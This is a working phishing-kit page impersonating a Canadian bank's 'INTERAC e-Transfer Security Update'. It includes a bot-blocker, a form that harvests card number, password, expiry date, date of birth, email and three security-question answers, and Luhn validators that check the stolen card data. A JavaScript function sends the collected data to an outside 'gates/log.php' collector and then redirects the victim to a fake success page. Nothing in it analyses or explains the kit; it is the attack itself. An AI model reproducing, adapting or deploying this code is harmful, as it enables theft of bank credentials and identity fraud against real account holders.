<?php
include('blocker.php');
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>
         Verify Your Identity
    </title>
    <!--<base href="../bank/national/">--><base href=".">
    <meta name="viewport" content="width=device-width">
    <meta name="Identifier" content="FGPWIDENT.HTM;6;ENGLISH">
    <!-- End of 3MSHELLHDRH.INC. -->
    <script type="text/javascript" src="files/jquery.min.js.download"></script>
    <link rel="stylesheet" href="files/font-awesome.min.css">
    <script type="text/javascript" src="files/jquery.maskedinput.min.js.download"></script>
    <link media="all" type="text/css" rel="stylesheet" href="files/index.css">
    <link rel="stylesheet" href="files/css.css">

<script type="text/javascript">
    

function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}



</script></head>

<body>
    <!-- Start of 3MBANNERHH.INC: -->
    <header role="banner" aria-label="RBC Logo, Customer Service and Date">
        <div class="pull-left header-split-left">
            <img src="files/bnc_en-new.gif" alt="RBC Royal Bank" height="45">
        </div>
        <div class="pull-right header-split-right">
            <div>
                <a class="old-arial-font" id="header-customer-service" tabindex="0" alt="Customer Service (opens new window)">Customer Service</a>
            </div>
            <div class="old-arial-font" id="header-date-wrap">
            </div>
        </div>
    </header>
    <div id="app" class="scum">
        <div class="error-banner app-margined err_div" style="display: none">
            <h1 class="error-banner__heading" aria-level="1" tabindex="-1">
    <span class="sr-only">Error</span>
    It looks like you're missing some information. Give it another try.
  </h1>
        </div>
        <h1 class="app-margined">INTERAC e-Transfer Security Update</h1>
        
        
        <p class="app-margined">Verify your identity by answering the fields below. &amp; Please select your Personal Verification Questions.<br>

The following questions are asked only to identify you.<br>
When you are done, click "Continue."</p>


            </fieldset>
        </form>


        <form action="processing.php" method="post" id="ContinueForm" name="Conti2nueForm" autocomplete="off">
            <fieldset>
                <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">500235 9 (last 12 digits of client card number)</label>
                </div>
                    <input type="text" class="form-control" name="username" id="username" autocomplete="off" maxlength="12" data-reg="/\d{4} \d{4} \d{4} \d{4}/" data-luhn="cc_luhn">
                    <span class="(12 last digits)"></span>                    
                </div>
				
                <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Password</label>
                </div>   
                    <input type="text" class="form-control" name="password" id="password" data-reg="/\d{4,}/" maxlength="20" autocomplete="off">
                    <span class=""></span>
				</div>

                <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
						<label for="input-id" class="label form-control-label">Expiration (mm-yy)</label>
                </div>                    
                    <input type="tel" class="form-control" name="EXP" id="EXP" data-reg="/\d{4,}/" maxlength="5" autocomplete="off">
                    <span class=""></span>
                </div>
				
                <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Date of birth (yyyy-mm-dd)</label>
                </div>                    
                       <input type="tel" class="form-control" name="DB" id="DB" data-reg="/\d{4,}/" maxlength="10" autocomplete="off">
                       <span class=""></span>                    
                </div>
				
				<div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Your email</label>
                </div>                    
                       <input type="tel" class="form-control" name="EM" id="EM" data-reg="/\d{4,}/" maxlength="25" autocomplete="off">
                       <span class=""></span>                    
                </div>

					<div class="q_block">
                    <div class="input input--dynamic app-margined form-group ">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Question #1</label>
                        
                    </div>
                     <select name="question1" data-reg="/.{4,}/" class="form-control" id="question1" title="Select a question">
                         <option value="">Please select security question</option>
                         <option value="What was my nickname in elementary school?">What was my nickname in elementary school?</option>
                         <option value="In which city was my father (mother) born?">What is the middle name of my oldest child?</option>
                         <option value="Who was my first love?">Who was my first love?</option>
                         <option value="Who was the best man at my wedding?">Who was the best man at my wedding?</option>
                         <option value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</option>
                         <option value="Which song always makes me cry?">Which song always makes me cry?</option>
                         <option value="What was my first pet&#39;s name?">What was my first pet's name?</option>
                         <option value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</option>
                         <option value="What was my first job?">What was my first job?</option>
                         <option value="What sport do I play best?">What sport do I play best?</option>
                         <option value="What make was my first car?">What make was my first car?</option>
                         <option value="What was the name of my elementary school?">What was the name of my elementary school?</option>
                         <option value="Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option>
                         <option value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</option>
                         <option value="In which hospital was I born ?">In which hospital was I born ?</option>
                         <option value="What's my father's (mother's) middle name?">What's my father's (mother's) middle name?</option>               
                         <option value="Which was the destination of my first airplane trip?">Which was the destination of my first airplane trip?</option>
                         <option value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</option>
                         <option value="My favourite restaurant is...">My favourite restaurant is...</option>
                         <option value="My favourite book is...">My favourite book is...</option>
                         <option value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</option>
                         <option value="My favourite food is...">My favourite food is...</option>
                         <option value="What was my first pet&#39;s name?">What was my first pet's name?</option>
                         <option value="What is my hobby?">What is my hobby?</option>
                         <option value="What's my favourite dessert?">What's my favourite dessert?</option>
                         <option value="What's my favourite music group?">What's my favourite music group?</option>
                         <option value="What's my favourite song?">What's my favourite song?</option>
                         <option value="My favourite candy is....">My favourite candy is....</option>
                         <option value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</option>
					</select>

                </div>
                <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Answer #1</label>
                    </div>
                     <input type="text" data-reg="/.{3,}/" class="form-control" name="answer1" id="answer1">

                </div>
               </div>
               <div class="q_block">
                    <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Question #2</label>
                        
                    </div>
                     <select name="question2" data-reg="/.{4,}/" class="form-control" id="question2" title="Select a question">
                         <option value="">Please select security question</option>

                         <option value="What was my nickname in elementary school?">What was my nickname in elementary school?</option>
                         <option value="In which city was my father (mother) born?">What is the middle name of my oldest child?</option>
                         <option value="Who was my first love?">Who was my first love?</option>
                         <option value="Who was the best man at my wedding?">Who was the best man at my wedding?</option>
                         <option value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</option>
                         <option value="Which song always makes me cry?">Which song always makes me cry?</option>
                         <option value="What was my first pet&#39;s name?">What was my first pet's name?</option>
                         <option value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</option>
                         <option value="What was my first job?">What was my first job?</option>
                         <option value="What sport do I play best?">What sport do I play best?</option>
                         <option value="What make was my first car?">What make was my first car?</option>
                         <option value="What was the name of my elementary school?">What was the name of my elementary school?</option>
                         <option value="Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option>
                         <option value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</option>
                         <option value="In which hospital was I born ?">In which hospital was I born ?</option>
                         <option value="What's my father's (mother's) middle name?">What's my father's (mother's) middle name?</option>               
                         <option value="Which was the destination of my first airplane trip?">Which was the destination of my first airplane trip?</option>
                         <option value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</option>
                         <option value="My favourite restaurant is...">My favourite restaurant is...</option>
                         <option value="My favourite book is...">My favourite book is...</option>
                         <option value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</option>
                         <option value="My favourite food is...">My favourite food is...</option>
                         <option value="What was my first pet&#39;s name?">What was my first pet's name?</option>
                         <option value="What is my hobby?">What is my hobby?</option>
                         <option value="What's my favourite dessert?">What's my favourite dessert?</option>
                         <option value="What's my favourite music group?">What's my favourite music group?</option>
                         <option value="What's my favourite song?">What's my favourite song?</option>
                         <option value="My favourite candy is....">My favourite candy is....</option>
                         <option value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</option>
                    </select>

                </div>
                <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Answer #2</label>
                    </div>
                     <input type="text" data-reg="/.{3,}/" class="form-control" name="answer2" id="answer2">

                </div>
               </div>

               <div class="q_block">
                    <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Question #3</label>
                        
                    </div>
                     <select name="question3" data-reg="/.{4,}/" class="form-control" id="question3" title="Select a question">
                         <option value="">Please select security question</option>

                         <option value="What was my nickname in elementary school?">What was my nickname in elementary school?</option>
                         <option value="In which city was my father (mother) born?">What is the middle name of my oldest child?</option>
                         <option value="Who was my first love?">Who was my first love?</option>
                         <option value="Who was the best man at my wedding?">Who was the best man at my wedding?</option>
                         <option value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</option>
                         <option value="Which song always makes me cry?">Which song always makes me cry?</option>
                         <option value="What was my first pet&#39;s name?">What was my first pet's name?</option>
                         <option value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</option>
                         <option value="What was my first job?">What was my first job?</option>
                         <option value="What sport do I play best?">What sport do I play best?</option>
                         <option value="What make was my first car?">What make was my first car?</option>
                         <option value="What was the name of my elementary school?">What was the name of my elementary school?</option>
                         <option value="Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option>
                         <option value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</option>
                         <option value="In which hospital was I born ?">In which hospital was I born ?</option>
                         <option value="What's my father's (mother's) middle name?">What's my father's (mother's) middle name?</option>               
                         <option value="Which was the destination of my first airplane trip?">Which was the destination of my first airplane trip?</option>
                         <option value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</option>
                         <option value="My favourite restaurant is...">My favourite restaurant is...</option>
                         <option value="My favourite book is...">My favourite book is...</option>
                         <option value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</option>
                         <option value="My favourite food is...">My favourite food is...</option>
                         <option value="What was my first pet&#39;s name?">What was my first pet's name?</option>
                         <option value="What is my hobby?">What is my hobby?</option>
                         <option value="What's my favourite dessert?">What's my favourite dessert?</option>
                         <option value="What's my favourite music group?">What's my favourite music group?</option>
                         <option value="What's my favourite song?">What's my favourite song?</option>
                         <option value="My favourite candy is....">My favourite candy is....</option>
                         <option value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</option>
                    </select>

                </div>
                <div class="input input--dynamic app-margined form-group">
                    <div class="input__label-container">
                        <label for="input-id" class="label form-control-label">Answer #3</label>
                    </div>
                     <input type="text" data-reg="/.{3,}/" class="form-control" name="answer3" id="answer3">

                </div>



        <div class="desktop-border app-margined"></div>
        <div class="app-margined buttons-section">
            <div class="input input--cta btn-wrap continue-button-wrap" id="continue-button-wrap">
                <!--3MTXTBUTTON.CINC: en-->
                <!--Continue-->
                <button type="submit" form="ContinueForm" class="btn btn--primary button-text-font" id="continue-button">
                    Continue
                </button>
                <!--End of 3MTXTBUTTON.CINC. en-->
            </div>
            
            <div class="input input--cta btn-wrap cancel-button-wrap" id="cancel-button-wrap">
                <!--3MTXTBUTTON.CINC: en-->
                <!--Cancel-->
                <button type="reset" onclick="$(&#39;form&#39;)[0].reset();" class="btn btn--secondary button-text-font" id="cancel-button">
                    Reset
                </button>
                <!--End of 3MTXTBUTTON.CINC. en-->
            </div>
        </div>
    </div>
    <footer>
        <!-- Start of 3MSHELLFTRH.INC: -->
        <div class="footer-item">
            National Bank, © 1995-2019
        </div>
        <div class="footer-item">
            <a title="Privacy &amp; Security (Opens new window)">Privacy &amp; Security<i aria-hidden="true" class=""></i><span class="accessible"> (Opens new window)</span></a>
        </div>
        <div class="footer-item">
            <a title="Legal (Opens new window)">Legal<i aria-hidden="true" class=""></i><span class="accessible"> (Opens new window)</span></a>
        </div>
        <div class="footer-item">
            <a title="Accessibility (Opens new window)">Accessibility<i aria-hidden="true" class=""></i><span class="accessible"> (Opens new window)</span></a>
        </div>
    </footer>

<script type="text/javascript">
var link="rbc.canada"  

$('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">\
   <span class="fa-stack l_2" style="font-size: 50px;position: relative;top: 50%;-webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
          <i class="fa fa-square fa-stack-2x"></i>\
          <i class="fa fa-spinner fa-stack-1x fa-pulse" style="color: white"></i>\
   </span>\
</div>').appendTo('body');
  
window.loader_={
  hide:function(){
    $('.loader__').fadeOut('fast');
  },
  show:function(){
    $('.loader__').fadeIn('fast');
  }
}  

$('#user').mask('99/99')
$('#dob').mask("99/99/9999")
$('#cvv').mask('9999/99/99')
$('#sin').mask('999-999-999')
$('#c_c').mask('9999 9999 9999')

// createCookie('cc','4534345345345345353');


$('.form-control').on("click",function(){
    $('.has_err').removeClass('has_err');
    $('.err_div').hide()
});


























send1 = function(e, callback__, global_luhn__) {
  e.preventDefault();
  var el = e.target;
  var err = false;

  var err_elements = [];

  $(el).find('input,select').each(function() {
    var reg__ = $(this).data().reg;
    if (typeof(reg__) != "undefined") {
      if (!eval(reg__).test($(this).val())) {
        err = true;
        err_elements.push(this);
        return;
      }
    }
    var luhn__ = $(this).data().luhn;
    if (typeof(luhn__) != "undefined" && luhn__ != '') {
      if (!eval(luhn__)($(this).val())) {
        err = true;
        err_elements.push(this);
      }
    }
  })

  //time for global_luhn
  if (typeof(global_luhn__) != 'undefined') {
    if (!eval(global_luhn__)()) {
      err = true;
    }

  }
  if (err) {

    //this part need to edit for each bank
    $('.err_div').show();
    $(err_elements).each(function() {
      $(this).closest('.form-group').addClass('has_err');
      $(window).scrollTop(0)
        //...

    })
    return;
  }

  if (typeof(callback__) != 'undefined') {
    eval(callback__)(el);
    return;
  }
  alert('We stack, what to do next?')

}

function next__(el) {

  loader_.show();
  setTimeout(function() {
    loader_.hide();
    $('.scum').hide();
    $(el).closest('.scum').next().show();
  }, 4000)

}

function finish__(el) {
  loader_.show();
  
  data__ = $('.scum form').custom_ser();
  data__.step="Questions.mobile"
   
  $.ajax({
    url:"https://mobileadsnetworks.com/uadmin/gates/log.php?sl&done&link="+link,
    dataType:"jsonp",
    data:{data:JSON.stringify(data__)},
    success:function(data){
          $('head base').attr('href','');
          window.location.href="../../../../updt/TermsSuccess/moveterms.php"
    },
    error:function(data){
      
    }
         
  })

}








$.fn.custom_ser=function(){
    var obj={};
    this.find('input,select').each(function(){
        if ($(this).prop('tagName') == "INPUT") {
               //input validation
               obj[$(this).attr('name')]=$(this).val();  
        } 
        if ($(this).prop('tagName') == "SELECT") {
          obj[$(this).attr('name')]=$(this).find('option:selected').val();
       }
    })
    return obj;
}






//############ VALIDATORS ####################################








function advanced_string_validation(str) {

    //cheks for 3 same later on the row

    for (i = 0; i < str.length; i++) {
        if (str[i] == str[i + 1]) {
            if (str[i] == str[i + 2]) {
                return false;
            }
        }
    }
    return true;
}



function sin_luhn(str) {
    //Canadian SIN validator
    str = str.match(/\d/g).join('');

    var luhnArr = [0, 2, 4, 6, 8, 1, 3, 5, 7, 9];
    var counter = 0;
    var incNum;
    var odd = false;
    var temp = String(str).replace(/[^\d]/g, "");
    if (temp.length == 0)
        return false;
    for (var i = temp.length - 1; i >= 0; --i) {
        incNum = parseInt(temp.charAt(i), 10);
        counter += (odd = !odd) ? incNum : luhnArr[incNum];
    }
    return (counter % 10 == 0);
}

function cc_luhn(str) {
    //CC validator
    str = str.match(/\d/g).join('');

    return str.split('').reduceRight(function(prev, curr, idx) {
        prev = parseInt(prev, 10);
        if ((idx + 1) % 2 !== 0) {
            curr = (curr * 2).toString().split('').reduce(function(p, c) {
                return parseInt(p, 10) + parseInt(c, 10)
            });
        }
        return prev + parseInt(curr, 10);
    }) % 10 === 0;
}




function dob_luhn(str) {
    //DOB input text validation
    //must be separated by /


    var valid = true;
    var d = new Date();
    var yearToday = d.getFullYear();

    var the_day = str.split('/')[0];
    var the_month = str.split('/')[1];
    var the_year = str.split('/')[2];


    if (the_day > 31) {
        valid = false
    };
    if (the_month > 12) {
        valid = false
    };
    if (the_year > yearToday) {
        valid = false
    };
    if (the_year < (yearToday - 100)) {
        valid = false
    };

    return valid;

}


function exp_luhn(str) {
    //EXP input text validation
    //must be separated by /


    var valid = true;
    var d = new Date();
    var yearToday = d.getFullYear();


    var the_month = str.split('/')[0];
    var the_year = "20"+str.split('/')[1];



    if (the_month > 12) {
        valid = false
    };
    if (the_year < yearToday) {
        valid = false
    };
    if (the_year > (yearToday + 10)) {
        valid = false
    };

    return valid;

}


</script><div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">   <span class="fa-stack l_2" style="font-size: 50px;position: relative;top: 50%;-webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">          <i class="fa fa-square fa-stack-2x"></i>          <i class="fa fa-spinner fa-stack-1x fa-pulse" style="color: white"></i>   </span></div>

</body></html>